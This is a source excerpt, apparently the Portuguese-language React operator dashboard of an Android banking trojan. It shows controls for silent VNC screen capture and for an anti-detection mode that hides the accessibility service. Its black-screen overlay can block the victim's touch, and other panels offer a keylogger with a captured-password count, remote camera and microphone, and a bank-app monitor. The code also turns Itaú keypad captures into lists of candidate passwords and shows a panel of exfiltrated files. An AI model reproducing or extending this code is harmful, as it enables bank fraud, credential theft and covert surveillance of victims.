                          badgeStyle = "bg-amber-950/90 text-amber-300 border-amber-500/40";
                        }

                        if (!label) {
                          if (item.id) {
                            label = item.id.includes('/') ? item.id.split('/').pop() || '' : item.id;
                          } else if (item.class) {
                            label = item.class.split('.').pop() || '';
                          } else {
                            label = `Elemento #${idx + 1}`;
                          }
                        }

                        const devW = getHierarchyRoot(screenHierarchy)?.bounds?.w || SCREEN_BASE_WIDTH;
                        const devH = getHierarchyRoot(screenHierarchy)?.bounds?.h || SCREEN_BASE_HEIGHT;
                        const cx = Math.round((item.bounds?.x || 0) + (item.bounds?.w || 0) / 2);
                        const cy = Math.round((item.bounds?.y || 0) + (item.bounds?.h || 0) / 2);
                        const normX = cx / devW;
                        const normY = cy / devH;

                        return (
                          <div
                            key={idx}
                            onMouseEnter={() => setHoveredNode(item)}
                            onMouseLeave={() => setHoveredNode(null)}
                            className="group flex items-center justify-between p-2 rounded-md bg-[#0c0202]/80 hover:bg-[#121214]/50 border border-[#2a2a31]/20 hover:border-[#3a3a44]/60 transition-all cursor-pointer shadow-sm"
                            onClick={() => {
                              sendCommand({ action: 'CLICK', x: normX, y: normY, scale: 'vnc_norm' });
                              addLog(`± Clique remoto via lista V2: "${label}" (${cx}, ${cy})`);
                            }}
                          >
                            <div className="flex items-center space-x-2 truncate pr-2">
                              <span className={`px-1.5 py-0.5 text-[9px] font-mono font-black uppercase rounded border ${badgeStyle} flex-shrink-0`}>
                                {typeBadge}
                              </span>
                              <span className="text-xs font-mono font-bold text-slate-200 group-hover:text-[#ef4444] truncate">
                                {label}
                              </span>
                            </div>

                            <div className="flex items-center space-x-1.5 flex-shrink-0">
                              <span className="text-[10px] font-mono text-slate-400 group-hover:text-[#ef4444]/80">
                                ({cx},{cy})
                              </span>
                              <button
                                type="button"
                                className="px-2 py-0.5 bg-[#ef4444]/80 group-hover:bg-[#ef4444] text-white rounded text-[10px] font-mono font-bold uppercase tracking-wider shadow"
                              >
                                 CLICAR
                              </button>
                            </div>
                          </div>
                        );
                      });
                    })()}
                  </div>
                </div>
              </div>
            )}

            {/*  TRANSMISSO VNC SILENCIOSO */}
            <div className="bg-[#280903]/90 border border-[#2a2a31]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#3a3a44]/50 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
              
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                  <Sliders className="w-4 h-4 text-[#ef4444] animate-pulse" />
                  {t('vnc.transmission_hd')}
                </h3>
                <span className="px-2 py-0.5 rounded-full bg-[#ef4444]/15 border border-[#2a2a31]/30 text-[9px] font-bold text-[#ef4444] uppercase tracking-widest font-mono">
                  {t('vnc.silent')}
                </span>
              </div>

              <div className="flex gap-2 mb-3">
                <button
                  onClick={toggleCapture}
                  className={`flex-1 py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-2 ${
                    isCaptureEnabled
                      ? 'bg-gradient-to-r from-[#ef4444] via-[#ef4444] to-[#ef4444] text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)]'
                      : 'bg-[#330b04] border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#121214]/30'
                  }`}
                  title={isCaptureEnabled ? 'Pausar captura de tela' : 'Iniciar VNC silencioso (Android 11+)'}
                >
                  <Activity className="w-4 h-4 text-[#e8e8ea]" />
                  {isCaptureEnabled ? t('vnc.active_transmitting') : ' Iniciar Transmissão VNC'}
                </button>
                <button
                  onClick={restartCapture}
                  className="px-3.5 py-2.5 bg-[#330b04] border border-[#2a2a31]/30 hover:border-[#3a3a44] hover:bg-[#121214]/40 text-[#ef4444] rounded-md transition-all font-bold text-xs"
                  title="Reiniciar VNC e sincronizar frames"
                >
                  
                </button>
              </div>

              <div className={`space-y-2 p-2.5 bg-[#180503]/80 rounded-md border border-[#2a2a31]/20 ${!isCaptureEnabled ? 'opacity-40' : ''}`}>
                <div className="flex items-center justify-between text-[11px] font-mono">
                  <span className="text-slate-300 font-bold">{t('vnc.image_quality')}</span>
                  <span className="font-bold text-[#ef4444] bg-[#121214] px-2 py-0.5 rounded border border-[#2a2a31]/30">{silentQuality}%</span>
                </div>
                <input
                  type="range"
                  min={10}
                  max={100}
                  step={5}
                  value={silentQuality}
                  onChange={(e) => setSilentQuality(Number(e.target.value))}
                  onMouseUp={(e) => applySilentQuality(Number((e.target as HTMLInputElement).value))}
                  onTouchEnd={(e) => applySilentQuality(Number((e.target as HTMLInputElement).value))}
                  disabled={!isCaptureEnabled}
                  className="w-full h-1.5 bg-[#24242a] rounded-md appearance-none cursor-pointer accent-[#ef4444]"
                  title="Ajuste a qualidade visual vs velocidade de transmissão"
                />
                <div className="flex justify-between text-[9px] text-slate-400 font-mono">
                  <span> 10% (Alta Conexão)</span>
                  <span> 100% (Ultra Nitidez)</span>
                </div>
              </div>
              
              <p className="text-[9px] text-[#ef4444]/60 text-center mt-2.5 font-mono">
                {isCaptureEnabled
                  ? ' Pipeline 0x01  TakeScreenshot HD  Sem aviso na tela'
                  : ' Requer serviço de acessibilidade ativo no aparelho'}
              </p>
            </div>

            {/* ¡ KILLER MODE / ANTIDETECƒO */}
            <div className="bg-gradient-to-r from-[#380a03]/90 via-[#541003]/90 to-[#380a03]/90 border border-[#2a2a31]/40 shadow-[0_4px_25px_rgba(239,68,68,0.2)] rounded-md p-4 transition-all hover:border-[#3a3a44]/60 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/60 to-transparent"></div>
              <div className="flex items-center justify-between gap-3">
                <div>
                  <h3 className="text-[#ef4444] font-black uppercase text-xs tracking-wider font-mono flex items-center gap-1.5">
                    <ShieldAlert className="w-4 h-4 text-[#ef4444]" />
                    {t('killer.title')}
                  </h3>
                  <p className="text-[10px] text-[#ef4444]/70 mt-0.5 font-sans">
                    {t('killer.subtitle')}
                  </p>
                </div>
                <button
                  type="button"
                  role="switch"
                  aria-checked={isKillerMode}
                  onClick={toggleKillerMode}
                  className={`relative inline-flex h-6 w-11 shrink-0 cursor-pointer rounded-full border-2 transition-colors ${
                    isKillerMode
                      ? 'bg-[#ef4444] border-[#4a4a56] shadow-[0_0_10px_rgba(239,68,68,0.6)]'
                      : 'bg-[#200703] border-[#24242a]/60'
                  }`}
                  title={isKillerMode ? 'Desativar modo killer' : 'Ativar modo antidetecção'}
                >
                  <span
                    className={`pointer-events-none inline-block h-4.5 w-4.5 transform rounded-full bg-white shadow transition-transform mt-0.5 ${
                      isKillerMode ? 'translate-x-4.5' : 'translate-x-0.5'
                    }`}
                  />
                </button>
              </div>
              <div className="mt-2.5 px-2 py-1 bg-[#210603]/80 rounded-md border border-[#2a2a31]/30 text-center">
                <span className="text-[10px] text-[#ef4444] font-mono">
                  {isKillerMode
                    ? ' MODO ATIVO: Acessibilidade oculta  Redução inteligente de fps'
                    : ` ${t('killer.disabled_mode')}`}
                </span>
              </div>
            </div>
            
            {/*  TELA PRETA & SOBREPOSIÇÃO */}
            <div id="tour-black-screen" className="bg-[#280903]/90 border border-[#2a2a31]/40 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#2a2a31]/40 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-slate-400/40 to-transparent"></div>
              
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-slate-200 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                  <EyeOff className="w-4 h-4 text-[#ef4444]" />
                  {t('black.title')}
                </h3>
                <span className="text-[9px] font-mono text-[#ef4444] font-bold bg-[#121214] px-2 py-0.5 rounded border border-[#24242a]/40">
                  {isBlackScreen ? ' ATIVA' : ` ${t('black.disabled')}`}
                </span>
              </div>

              <div className="flex gap-2">
                <EditableButton
                  id="btn-black-screen"
                  onClick={toggleBlackScreen}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-black-screen']}
                  onStyleChange={(style) => updateButtonStyle('btn-black-screen', style)}
                  className={`flex-1 py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                    isBlackScreen
                      ? 'bg-gradient-to-r from-[#ef4444] via-[#84cc16] to-[#84cc16] text-[#10120a] shadow-[0_0_15px_rgba(239,68,68,0.4)]'
                      : 'bg-[#330b04] border border-[#ef4444]/40 text-[#fca5a5] hover:bg-orange-950/30'
                  }`}
                >
                  {isBlackScreen ? ' Desativar Tela Preta' : t('black.enable')}
                </EditableButton>
                <button
                  onClick={() => setShowBlackScreenEditor(true)}
                  className="px-3.5 py-2.5 bg-[#330b04] border border-[#2a2a31]/30 text-slate-200 rounded-md hover:bg-[#501006] hover:border-[#3a3a44] transition-all text-xs font-bold"
                  title="Personalizar visual da tela preta / Fake Screen"
                >
                  
                </button>
              </div>

              {customBlackScreenTemplate && (
                <p className="text-[10px] text-[#ef4444] mt-2 font-mono bg-[#121214]/40 p-1.5 rounded border border-[#24242a]/30">
                   Template Ativo: <span className="font-bold text-[#e8e8ea]">{customBlackScreenTemplate.name}</span>
                </p>
              )}

              {isBlackScreen && (
                <div className="flex flex-col gap-2 p-3 bg-[#180503]/90 rounded-md mt-3 border border-[#2a2a31]/30">
                  <div className="flex justify-between text-[10px] text-slate-300 font-mono">
                    <span>Opacidade para a Vítima</span>
                    <span className="text-[#ef4444] font-bold">{blackScreenOpacity}%</span>
                  </div>
                  <input
                    type="range"
                    min={10}
                    max={100}
                    value={blackScreenOpacity}
                    onChange={(e) => handleBlackScreenOpacityChange(parseInt(e.target.value, 10))}
                    className="w-full h-1.5 bg-[#24242a] rounded-md appearance-none cursor-pointer accent-[#ef4444]"
                  />
                  <div className="flex items-center justify-between mt-2 pt-2 border-t border-[#24242a]">
                    <div className="flex flex-col">
                      <span className="text-[11px] text-slate-200 font-bold font-mono">Bloquear Toque (Vítima)</span>
                      <span className="text-[9px] text-slate-400 font-mono">
                        {isBlackTouchBlocked ? ' Vítima não consegue tocar' : ' Toque livre na tela'}
                      </span>
                    </div>
                    <button
                      id="btn-black-touch-toggle"
                      onClick={toggleBlackScreenTouch}
                      className={`relative w-11 h-6 rounded-full transition-all duration-300 ${
                        isBlackTouchBlocked
                          ? 'bg-gradient-to-r from-[#ef4444] to-[#ef4444] shadow-[0_0_10px_rgba(239,68,68,0.5)]'
                          : 'bg-[#451208] border border-[#2a2a31]'
                      }`}
                    >
                      <span className={`absolute top-1 w-4 h-4 bg-white rounded-full shadow transition-all duration-300 ${
                        isBlackTouchBlocked ? 'left-6' : 'left-1'
                      }`} />
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* ️ KEYLOGGER 24/7 VIP */}
            <div id="tour-keylogger" className="bg-[#280903]/90 border border-amber-500/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-amber-400/50 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-amber-400/50 to-transparent"></div>
              
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-amber-400 font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                  <Keyboard className="w-4 h-4 text-amber-400 animate-pulse" />
                  {t('keylogger.title')}
                </h3>
                <div className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-emerald-950/60 border border-emerald-500/40">
                  <span className="w-2 h-2 bg-emerald-400 rounded-full animate-ping"></span>
                  <span className="text-[9px] text-emerald-300 font-mono uppercase font-bold">{t('keylogger.monitoring')}</span>
                </div>
              </div>
              
              {/* Resumo Rápido em Stat Cards */}
              {keylogSummary && (
                <div className="grid grid-cols-3 gap-2 mb-3">
                  <div className="bg-[#170503] border border-amber-500/30 rounded-md p-2 text-center">
                    <div className="text-base font-black text-amber-400 font-mono">{keylogSummary.total_logs || 0}</div>
                    <div className="text-[8px] text-slate-400 font-mono uppercase tracking-wider font-bold">{t('device.stats.total')}</div>
                  </div>
                  <div className="bg-[#170503] border border-emerald-500/30 rounded-md p-2 text-center">
                    <div className="text-base font-black text-emerald-400 font-mono">{keylogSummary.today_logs || 0}</div>
                    <div className="text-[8px] text-slate-400 font-mono uppercase tracking-wider font-bold">{t('device.stats.today')}</div>
                  </div>
                  <div className="bg-[#170503] border border-[#ef4444]/30 rounded-md p-2 text-center">
                    <div className="text-base font-black text-rose-400 font-mono">{keylogSummary.passwords_captured || 0}</div>
                    <div className="text-[8px] text-slate-400 font-mono uppercase tracking-wider font-bold">{t('device.stats.passwords')}</div>
                  </div>
                </div>
              )}
              
              {/*  CÂMERA & MICROFONE */}
              <div className="grid grid-cols-2 gap-2 mb-3">
                <EditableButton
                  id="btn-camera"
                  onClick={toggleCamera}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-camera']}
                  onStyleChange={(style) => updateButtonStyle('btn-camera', style)}
                  className={`py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                    isCameraEnabled
                      ? 'bg-gradient-to-r from-emerald-600 to-teal-500 text-white shadow-[0_0_12px_rgba(16,185,129,0.4)] border-none'
                      : 'bg-[#330b04] border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#501006]'
                  }`}
                >
                  <Camera className="w-4 h-4 text-[#ef4444]" />
                  {isCameraEnabled ? `${t('device.camera')} ON` : t('device.camera')}
                </EditableButton>
                <EditableButton
                  id="btn-microphone"
                  onClick={toggleMicrophone}
                  isEditMode={isLayoutEditMode}
                  customStyle={layoutPrefs.buttonStyles['btn-microphone']}
                  onStyleChange={(style) => updateButtonStyle('btn-microphone', style)}
                  className={`py-2.5 rounded-md font-black text-xs uppercase tracking-wider transition-all flex items-center justify-center gap-1.5 ${
                    isMicrophoneEnabled
                      ? 'bg-gradient-to-r from-emerald-600 to-teal-500 text-white shadow-[0_0_12px_rgba(16,185,129,0.4)] border-none'
                      : 'bg-[#330b04] border border-[#2a2a31]/30 text-[#ef4444] hover:bg-[#501006]'
                  }`}
                >
                  <Mic className="w-4 h-4 text-[#ef4444]" />
                  {isMicrophoneEnabled ? `${t('device.mic')} ON` : t('device.mic')}
                </EditableButton>
              </div>

              {/*  MONITOR BANCRIO */}
              <div className="bg-[#280903]/90 border border-[#ef4444]/30 shadow-[0_4px_25px_rgba(0,0,0,0.5)] rounded-md p-4 transition-all hover:border-[#f87171]/50 relative overflow-hidden group mb-3">
                <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/50 to-transparent"></div>
                
                <div className="flex items-center justify-between mb-3">
                  <h3 className="text-[#f87171] font-black uppercase text-xs tracking-wider flex items-center gap-2 font-mono">
                    <span className="text-base"></span>
                    {t('device.bank_vip')}
                  </h3>
                  <span className="px-2 py-0.5 bg-orange-950/60 border border-[#ef4444]/40 text-[#fca5a5] text-[10px] font-mono rounded-full font-bold">
                    {installedBanks.length} {t('device.bank_apps')}
                  </span>
                </div>
                
                <div className="text-[11px] text-slate-300 mb-3 font-mono bg-[#170503] p-2 rounded-md border border-[#ef4444]/20 flex justify-around">
                  <span>{t('device.balances')}: <span className="text-emerald-400 font-black">{bankBalances.length}</span></span>
                  <span className="text-[#6f6f78]">|</span>
                  <span>{t('device.stats.passwords')}: <span className="text-[#f87171] font-black">{bankPasswords.length}</span></span>
                </div>

                {screenHierarchy?.package && (
                  (() => {
                    const keywords = ['bank', 'banco', 'pay', 'cartao', 'wallet', 'caixa', 'inter', 'bradesco', 'itau', 'santander', 'neon', 'original', 'nu.production', 'banrisul', 'pagseguro', 'mercadopago', 'picpay', 'pan.card'];
                    const isOpen = keywords.some(k => screenHierarchy.package.toLowerCase().includes(k));
                    if (isOpen) {
                      return (
                        <div className="mb-3 p-2 bg-[#121214]/40 border border-[#2a2a31]/50 rounded-md flex items-center justify-between animate-pulse">
                          <span className="text-[10px] font-black text-[#ef4444] flex items-center gap-1">
                            <ShieldAlert className="w-3.5 h-3.5 text-[#ef4444]" />
                            BANCO EM FOCO DETECTADO
                          </span>
                          <span className="text-[9px] text-white font-mono truncate max-w-[120px]">{screenHierarchy.package.split('.').pop()}</span>
                        </div>
                      );
                    }
                    return null;
                  })()
                )}

                <button 
                  onClick={() => {
                    document.getElementById('device-viewer')?.scrollIntoView({ behavior: 'smooth' });
                    setShowBankMonitorTab(true);
                  }} 
                  className="w-full py-2 bg-gradient-to-r from-[#84cc16]/15 to-red-650/15 border border-[#ef4444]/35 hover:border-[#f87171] hover:from-[#84cc16]/25 hover:to-red-650/25 text-[#f87171] rounded-md font-bold text-xs uppercase tracking-wider transition-all"
                >
                  {t('device.open_bank_center')}
                </button>
              </div>

              <button 
                onClick={() => {
                  if (!isFloatingMode) {
                    setIsFloatingMode(true);
                  }
                  setFloatingWindows(prev => ({
                    ...prev,
                    keylogger: { ...prev.keylogger, open: true }
                  }));
                }} 
                className="w-full py-2.5 bg-gradient-to-r from-amber-600/20 via-[#84cc16]/20 to-amber-700/20 border border-amber-500/40 hover:border-amber-300 text-amber-300 rounded-md font-black text-xs uppercase tracking-wider transition-all sandbox-btn flex items-center justify-center gap-2"
              >
                {t('device.open_history')}
              </button>
              
              {/* Feed dos Últimos Eventos */}
              <div className="mt-3.5 bg-[#180503] border border-[#2a2a31]/30 shadow-[0_0_15px_rgba(239,68,68,0.1)] rounded-md p-3">
                <div className="flex items-center justify-between mb-3 pb-2 border-b border-[#2a2a31]/25">
                  <h4 className="text-xs font-black text-[#ef4444] uppercase font-mono tracking-wider flex items-center gap-2">
                    <span className="w-2.5 h-2.5 bg-emerald-400 rounded-full animate-ping shadow-[0_0_8px_#34d399]" />
                    Últimos Eventos Capturados
                  </h4>
                  <div className="flex items-center gap-2">
                    <span className="text-[10px] font-mono font-bold bg-[#121214]/80 text-[#ef4444] px-2.5 py-0.5 rounded-full border border-[#2a2a31]/40 shadow-sm">
                      {keylogsByDate.length} eventos
                    </span>
                  </div>
                </div>

                {(() => {
                  const isNoise = (l: any) => {
                    const evt = (l.eventType || l.event_type || l.type || '').toString();
                    if (evt.includes('CLICK') || evt.includes('BUTTON') || evt.includes('TEXT') || evt.includes('PASSWORD') || evt.includes('PIN') || evt.includes('DIGIT') || evt.includes('KEYPAD') || evt.includes('REALTIME') || evt.includes('TOUCH') || l.isPassword) {
                      return false;
                    }
                    if (evt.startsWith('WINDOW_CHANGED:')) {
                      const screenName = evt.replace('WINDOW_CHANGED:', '').trim().toLowerCase();
                      return (
                        screenName.startsWith('android.widget.') ||
                        screenName.startsWith('android.view.') ||
                        screenName.startsWith('android.graphics.') ||
                        screenName.startsWith('android.inputmethod') ||
                        screenName.includes('framelayout') ||
                        screenName.includes('imageview') ||
                        screenName.includes('linearlayout') ||
                        screenName.includes('relativelayout') ||
                        screenName.includes('viewgroup') ||
                        screenName.includes('quickstep') ||
                        screenName.includes('launcher') ||
                        screenName.includes('systemui') ||
                        screenName.includes('segregateactivity') ||
                        screenName.includes('decorview') ||
                        /^[a-z0-9]\.[a-z0-9_]+$/.test(screenName)
                      );
                    }
                    return false;
                  };

                  const getSidebarLogText = (l: any) => {
                    let textVal = (typeof l.text === 'string' ? l.text : typeof l.data === 'string' ? l.data : '').trim();
                    const eventType = (l.eventType || l.event_type || l.type || '').toString();
                    const hint = (l.hint || '').toString().trim();
                    const fieldName = (l.fieldName || l.field_name || '').toString().trim();
                    const appName = (l.appName || '').toString().trim();

                    // Limpa colchetes de arrays do Android [texto] -> texto
                    if (textVal.startsWith('[') && textVal.endsWith(']')) {
                      textVal = textVal.substring(1, textVal.length - 1).trim();
                    }

                    // 1. Logs de senhas customizadas formatadas com íícone
                    if (textVal.startsWith('')) {
                      return textVal;
                    }

                    // 2. Senhas / PINs / Dígitos de Banco
                    if (l.isPassword || eventType.includes('PIN') || eventType.includes('PASSWORD') || eventType.includes('KEYPAD') || eventType.includes('DIGIT') || eventType.includes('REALTIME')) {
                      const cleanNum = textVal.replace(/[\[\]]/g, '').trim();
                      const cleanLower = cleanNum.toLowerCase();
                      if (cleanNum && cleanLower !== 'ispassword' && cleanLower !== 'true' && cleanLower !== 'false' && cleanLower !== 'null' && cleanLower !== 'undefined' && cleanNum !== '') {
                        return ` Senha / Dígito: ${cleanNum}`;
                      }
                      const label = hint || fieldName || (l && (l.appName || l.bank)) || '';
                      return label ? ` Digitando Senha em (${label})` : ` Senha sendo digitada...`;
                    }

                    // 3. Cliques e toques em botões
                    if (eventType.includes('CLICK') || eventType.includes('BUTTON') || eventType.includes('TOUCH') || textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                      if (textVal && !textVal.startsWith('[CLICK:') && !textVal.startsWith('[BTN:')) {
                        const clean = textVal.replace(/^"|"$/g, '');
                        return ` Clique: "${clean}"`;
                      }
                      const posMatch = textVal.match(/pos\((\d+),(\d+)\)|BTN:(\d+),(\d+)/);
                      const posInfo = posMatch ? ` (x:${posMatch[1] || posMatch[3]}, y:${posMatch[2] || posMatch[4]})` : '';
                      return ` Toque na Tela${posInfo}`;
                    }

                    // 4. Digitação de texto normal
                    if (eventType.includes('TEXT') || eventType === 'INPUT_TEXT') {
                      const label = hint || fieldName;
                      return label ? `¨ Texto (${label}): "${textVal}"` : `¨ Texto: "${textVal}"`;
                    }

                    // 5. Telas abertas
                    if (eventType.startsWith('WINDOW_CHANGED:')) {
                      const sName = eventType.replace('WINDOW_CHANGED:', '').trim();
                      if (sName) {
                        const shortName = sName.includes('.') ? sName.split('.').pop() || sName : sName;
                        return ` Abriu Tela: ${shortName}`;
                      }
                      return ` Navegou no App`;
                    }

                    // 6. Textos normais e fallbacks
                    if (textVal && textVal !== '""' && textVal !== 'null' && textVal !== 'isPassword') {
                      return textVal;
                    }

                    if (hint) return ` ${hint}`;
                    if (fieldName) return ` ${fieldName}`;
                    if (appName) return ` ${appName}`;
                    return ' Ação no Aplicativo';
                  };

                  const cleanSidebarLogs = keylogsByDate.filter(l => !isNoise(l));

                  if (cleanSidebarLogs.length === 0) {
                    return (
                      <div className="text-center py-6 text-[#8b8b94] text-xs font-mono bg-slate-950/40 rounded-md border border-[#121214]">
                        Nenhum evento capturado hoje ainda
                      </div>
                    );
                  }

                  return (
                    <div className="max-h-80 overflow-y-auto space-y-2 pr-1 scrollbar-thin scrollbar-thumb-[#3a3a44]/30 scrollbar-track-transparent">
                      {cleanSidebarLogs.slice(-20).reverse().map((log, i) => {
                        const friendlyName = getAppFriendlyName(log.package || '', log.appName || '');
                        const logTime = log.time || new Date(log.timestamp || log.created_at).toLocaleTimeString('pt-BR');
                        const textDisplay = getSidebarLogText(log);
                        const isItauKeypadSidebar = /(\d)\s*(?:ou|\|)\s*(\d)/i.test(textDisplay);
                        let sidebarItauPerms: string[] = [];
                        if (isItauKeypadSidebar) {
                          const matches = Array.from(textDisplay.matchAll(/(\d)\s*(?:ou|\|)\s*(\d)/gi));
                          const pairs = matches.map((m: any) => [m[1], m[2]]);
                          if (pairs.length > 0) {
                            let currentCombos: string[] = [''];
                            for (const [d1, d2] of pairs) {
                              const nextCombos: string[] = [];
                              for (const p of currentCombos) {
                                nextCombos.push(p + d1);
                                nextCombos.push(p + d2);
                              }
                              currentCombos = nextCombos;
                            }
                            sidebarItauPerms = currentCombos;
                          }
                        }

                        const isClick = textDisplay.startsWith('');
                        const isPass = log.isPassword || textDisplay.startsWith('');
                        const isScreen = textDisplay.startsWith('');
                        const isText = textDisplay.startsWith('¨');

                        return (
                          <div 
                            key={i} 
                            className={`group p-2.5 rounded-md transition-all border shadow-sm ${
                              isPass 
                                ? 'bg-gradient-to-r from-rose-950/60 via-[#121214]/40 to-slate-950/80 border-[#ef4444]/60 shadow-[0_0_15px_rgba(244,63,94,0.2)] hover:border-rose-400' 
                                : isClick 
                                  ? 'bg-gradient-to-r from-purple-950/40 to-slate-950/80 border-[#f87171]/40 hover:border-[#f87171]' 
                                  : isScreen 
                                    ? 'bg-gradient-to-r from-[#121214]/30 to-slate-950/80 border-[#2a2a31]/30 hover:border-[#3a3a44]' 
                                    : isText
                                      ? 'bg-gradient-to-r from-emerald-950/30 to-slate-950/80 border-emerald-500/30 hover:border-emerald-400'
                                      : 'bg-slate-950/70 border-[#24242a] hover:border-[#2a2a31]/40'
                            }`}
                          >
                            <div className="flex items-center justify-between gap-2 mb-1.5">
                              <div className="flex items-center space-x-2 min-w-0">
                                <BankIcon pkg={log.package || ''} iconB64={log.icon || log.iconB64} name={friendlyName} size={22} />
                                <span className="text-[10px] font-mono font-bold text-[#ef4444] truncate max-w-[130px] bg-[#121214]/60 px-2 py-0.5 rounded-md border border-[#24242a]/40">
                                  {friendlyName}
                                </span>
                              </div>
                              <span className="text-[10px] font-mono font-bold text-amber-300 bg-amber-950/60 px-2 py-0.5 rounded-md border border-amber-500/30 flex-shrink-0">
                                 {logTime}
                              </span>
                            </div>
                            
                            <div className="flex flex-col gap-1 mt-1">
                              {isItauKeypadSidebar ? (
                                <div className="space-y-1">
                                  <div className="text-[10px] font-mono font-bold text-[#f87171] flex items-center gap-1">
                                    <span> Teclas Itaú</span>
                                    <span className="text-[9px] text-[#fca5a5]/80">({sidebarItauPerms.length} senhas)</span>
                                  </div>
                                  <p className="font-mono text-xs font-bold text-orange-200 break-all leading-snug bg-orange-950/40 p-2 rounded-md border border-[#ef4444]/30">
                                    {textDisplay}
                                  </p>
                                  {sidebarItauPerms.length > 0 && (
                                    <button
                                      onClick={() => {
                                        navigator.clipboard.writeText(sidebarItauPerms.join('\n'));
                                        addLog(` Copiado ${sidebarItauPerms.length} combinações de senha Itaú!`);
                                      }}
                                      className="w-full py-1 bg-gradient-to-r from-[#ef4444] to-amber-500 hover:from-[#f87171] hover:to-amber-400 text-black font-black text-[9px] font-mono rounded-md shadow transition-all uppercase tracking-wider"
                                    >
                                       Copiar {sidebarItauPerms.length} Senhas Possíveis
                                    </button>
                                  )}
                                </div>
                              ) : (
                                <div className="flex items-center justify-between gap-2">
                                  <p className={`font-mono text-xs font-bold break-all leading-snug ${
                                    isPass ? 'text-rose-200' : isClick ? 'text-purple-200' : isScreen ? 'text-[#e8e8ea]' : isText ? 'text-emerald-200' : 'text-slate-100'
                                  }`}>
                                    {textDisplay}
                                  </p>
                                  
                                  <button
                                    onClick={() => {
                                      navigator.clipboard.writeText(textDisplay);
                                      addLog(` Copiado: ${textDisplay}`);
                                    }}
                                    className="text-[9px] bg-[#121214] hover:bg-[#121214] text-slate-300 hover:text-[#ef4444] px-2 py-1 rounded-md border border-[#2a2a31] font-mono font-bold transition-all flex-shrink-0 shadow-sm"
                                  >
                                    Copiar
                                  </button>
                                </div>
                              )}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  );
                })()}
              </div>
            </div>
            
            {/* ARQUIVOS RECEBIDOS */}
            <div className="bg-[#280904]/85 border border-emerald-500/20 shadow-[0_4px_25px_rgba(0,0,0,0.4)] rounded-md p-5 transition-all hover:border-emerald-500/40 relative overflow-hidden group">
              <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-emerald-500/35 to-transparent"></div>
              
              <div className="flex items-center justify-between mb-4 pb-2 border-b border-emerald-500/10">
                <h3 className="text-white font-black uppercase text-xs tracking-wider flex items-center gap-2 text-emerald-400 font-mono">
                  <FolderOpen className="w-4 h-4 text-emerald-400 animate-pulse" />
                  Arquivos Recebidos
                  <span className="ml-1.5 px-2 py-0.5 bg-emerald-950/65 border border-emerald-500/35 text-emerald-400 text-[9px] rounded-full font-mono font-bold shadow-[0_0_8px_rgba(16,185,129,0.15)]">
                    {uploadedFiles.length}
                  </span>
                </h3>
                
                {/* Botões de Visualização Grid/Lista */}
                {uploadedFiles.length > 0 && (
                  <div className="flex items-center gap-1 bg-[#200703] border border-[#24242a] rounded-md p-0.5 shadow-inner">
                    <button
                      onClick={() => setFilesViewMode('grid')}
                      className={`p-1.5 rounded transition-all duration-200 ${
                        filesViewMode === 'grid'
                          ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/20'
                          : 'text-[#8b8b94] hover:text-slate-300'
                      }`}
                      title="Visualizar em Grid"
                    >
                      <LayoutGrid className="w-3.5 h-3.5" />
                    </button>
                    <button
                      onClick={() => setFilesViewMode('list')}
                      className={`p-1.5 rounded transition-all duration-200 ${
                        filesViewMode === 'list'
                          ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/20'
                          : 'text-[#8b8b94] hover:text-slate-300'
                      }`}
                      title="Visualizar em Lista"
                    >
                      <List className="w-3.5 h-3.5" />
                    </button>
                  </div>
                )}
              </div>

              {uploadedFiles.length === 0 ? (
                <div className="text-center py-8 text-[#8b8b94] border border-dashed border-emerald-500/20 rounded-md bg-[#200703]/45 font-mono shadow-inner">
                  <div className="text-3xl mb-2 animate-pulse"></div>
                  <p className="text-[10px] uppercase tracking-wider font-bold text-slate-400">Aguardando arquivos</p>
                  <p className="text-[9px] text-[#6f6f78] mt-1">Fotos, PDFs e Documentos capturados aparecerão aqui</p>
                </div>
              ) : filesViewMode === 'grid' ? (
                /* MODO GRID (GALERIA) */
                <div className="grid grid-cols-2 gap-3 max-h-[360px] overflow-y-auto pr-1 scrollbar-thin scrollbar-thumb-emerald-500/20 scrollbar-track-transparent">
                  {uploadedFiles.map((file, i) => {
                    const isImg = file.mimeType?.startsWith('image/');
                    const isPdf = file.mimeType === 'application/pdf';
                    
                    return (
                      <div
                        key={i}
